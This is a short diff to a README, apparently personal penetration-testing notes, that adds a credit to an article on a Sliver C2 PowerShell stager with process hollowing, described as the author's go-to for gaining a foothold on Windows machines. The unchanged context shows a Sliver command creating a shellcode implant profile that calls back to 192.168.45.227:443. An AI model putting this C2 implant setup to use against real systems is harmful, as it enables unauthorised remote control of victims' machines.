@@ -1,5 +1,10 @@
 # Overview
 
+## References
+Process Hollowing was taken from https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8
+This technique has been my main go-to for initial foothold onto a windows box that for the most part just works. 
+Huge thanks to Ycf-Kel
+
 # Sliver Setup
 ## Create profile local64 and point to port 443
 `sliver > profiles new --http 192.168.45.227:443 --format shellcode local64`
